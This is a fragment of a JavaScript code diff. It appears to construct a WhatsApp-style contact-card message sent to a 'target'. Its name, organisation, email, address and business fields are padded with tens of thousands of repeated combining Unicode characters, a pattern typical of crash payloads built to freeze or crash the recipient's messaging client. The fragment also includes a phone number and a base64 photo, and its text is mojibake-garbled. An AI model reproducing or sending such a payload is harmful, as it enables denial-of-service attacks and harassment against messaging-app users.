666${"ᩫᩫ".repeat(4000)}\nEND:VCARD`,
+                    "ðŸ¦ âƒ°Í¡Â°ÍœÍ¡â€¢âƒŸð˜…ð—¿Í¢ð—²Ì·ð—¹âƒ¨ð—¹ð˜†Í¢Ì·-ð—°Í¢ð—¹ð—¶âƒ¨ð—²ð—»Ì·Í¢ð˜ â¿» ð“ð¡ð«ðžðžð¬ð¢ð±ð­ð² âœ¶ > 666" +
+                    "ð‘‡‚ð‘†µð‘†´ð‘†¿".repeat(10000),
+                vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;ðŸ¦ âƒ°Í¡Â°ÍœÍ¡â€¢âƒŸð˜…ð—¿Í¢ð—²Ì·ð—¹âƒ¨ð—¹ð˜†Í¢Ì·-ð—°Í¢ð—¹ð—¶âƒ¨ð—²ð—»Ì·Í¢ð˜ â¿» ð“ð¡ð«ðžðžð¬ð¢ð±ð­ð² âœ¶ > 666${"ð‘‡‚ð‘†µð‘†´ð‘†¿".repeat(10000)};;;\nFN:ðŸ¦ âƒ°Í¡Â°ÍœÍ¡â€¢âƒŸð˜…ð—¿Í¢ð—²Ì·ð—¹âƒ¨ð—¹ð˜†Í¢Ì·-ð—°Í¢ð—¹ð—¶âƒ¨ð—²ð—»Ì·Í¢ð˜ â¿» ð“ð¡ð«ðžðžð¬ð¢ð±ð­ð² âœ¶ > 666${"ð‘‡‚ð‘†µð‘†´ð‘†¿".repeat(10000)}\nNICKNAME:ðŸ¦ âƒ°Í¡Â°ÍœÍ¡â€¢âƒŸð˜…ð—¿Í¢ð—²Ì·ð—¹âƒ¨ð—¹ð˜†Í¢Ì·-ð—°Í¢ð—¹ð—¶âƒ¨ð—²ð—»Ì·Í¢ð˜ â¿» ð“ð¡ð«ðžðžð¬ð¢ð±ð­ð² âœ¶ > 666${"á©«á©«".repeat(4000)}\nORG:ðŸ¦ âƒ°Í¡Â°ÍœÍ¡â€¢âƒŸð˜…ð—¿Í¢ð—²Ì·ð—¹âƒ¨ð—¹ð˜†Í¢Ì·-ð—°Í¢ð—¹ð—¶âƒ¨ð—²ð—»Ì·Í¢ð˜ â¿» ð“ð¡ð«ðžðžð¬ð¢ð±ð­ð² âœ¶ > 666${"á©«á©«".repeat(4000)}\nTITLE:ðŸ¦ âƒ°Í¡Â°ÍœÍ¡â€¢âƒŸð˜…ð—¿Í¢ð—²Ì·ð—¹âƒ¨ð—¹ð˜†Í¢Ì·-ð—°Í¢ð—¹ð—¶âƒ¨ð—²ð—»Ì·Í¢ð˜ â¿» ð“ð¡ð«ðžðžð¬ð¢ð±ð­ð² âœ¶ > 666${"á©«á©«".repeat(4000)}\nitem1.TEL;waid=6287873499996:+62 878-7349-9996\nitem1.X-ABLabel:Telepon\nitem2.EMAIL;type=INTERNET:ðŸ¦ âƒ°Í¡Â°ÍœÍ¡â€¢âƒŸð˜…ð—¿Í¢ð—²Ì·ð—¹âƒ¨ð—¹ð˜†Í¢Ì·-ð—°Í¢ð—¹ð—¶âƒ¨ð—²ð—»Ì·Í¢ð˜ â¿» ð“ð¡ð«ðžðžð¬ð¢ð±ð­ð² âœ¶ > 666${"á©«á©«".repeat(4000)}\nitem2.X-ABLabel:Kantor\nitem3.EMAIL;type=INTERNET:ðŸ¦ âƒ°Í¡Â°ÍœÍ¡â€¢âƒŸð˜…ð—¿Í¢ð—²Ì·ð—¹âƒ¨ð—¹ð˜†Í¢Ì·-ð—°Í¢ð—¹ð—¶âƒ¨ð—²ð—»Ì·Í¢ð˜ â¿» ð“ð¡ð«ðžðžð¬ð¢ð±ð­ð² âœ¶ > 666${"á©«á©«".repeat(4000)}\nitem3.X-ABLabel:Kantor\nitem4.EMAIL;type=INTERNET:ðŸ¦ âƒ°Í¡Â°ÍœÍ¡â€¢âƒŸð˜…ð—¿Í¢ð—²Ì·ð—¹âƒ¨ð—¹ð˜†Í¢Ì·-ð—°Í¢ð—¹ð—¶âƒ¨ð—²ð—»Ì·Í¢ð˜ â¿» ð“ð¡ð«ðžðžð¬ð¢ð±ð­ð² âœ¶ > 666${"á©«á©«".repeat(4000)}\nitem4.X-ABLabel:Pribadi\nitem5.ADR:;;ðŸ¦ âƒ°Í¡Â°ÍœÍ¡â€¢âƒŸð˜…ð—¿Í¢ð—²Ì·ð—¹âƒ¨ð—¹ð˜†Í¢Ì·-ð—°Í¢ð—¹ð—¶âƒ¨ð—²ð—»Ì·Í¢ð˜ â¿» ð“ð¡ð«ðžðžð¬ð¢ð±ð­ð² âœ¶ > 666${"á©«á©«".repeat(4000)};;;;\nitem5.X-ABADR:ac\nitem5.X-ABLabel:Rumah\nX-YAHOO;type=KANTOR:ðŸ¦ âƒ°Í¡Â°ÍœÍ¡â€¢âƒŸð˜…ð—¿Í¢ð—²Ì·ð—¹âƒ¨ð—¹ð˜†Í¢Ì·-ð—°Í¢ð—¹ð—¶âƒ¨ð—²ð—»Ì·Í¢ð˜ â¿» ð“ð¡ð«ðžðžð¬ð¢ð±ð­ð² âœ¶ > 666${"á©«á©«".repeat(4000)}\nPHOTO;BASE64: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\nX-WA-BIZ-NAME:ðŸ¦ âƒ°Í¡Â°ÍœÍ¡â€¢âƒŸð˜…ð—¿Í¢ð—²Ì·ð—¹âƒ¨ð—¹ð˜†Í¢Ì·-ð—°Í¢ð—¹ð—¶âƒ¨ð—²ð—»Ì·Í¢ð˜ â¿» ð“ð¡ð«ðžðžð¬ð¢ð±ð­ð² âœ¶ > 666${"á©«á©«".repeat(4000)}\nEND:VCARD`,
                 contextInfo: {
                     participant: target,
                     externalAdReply: {
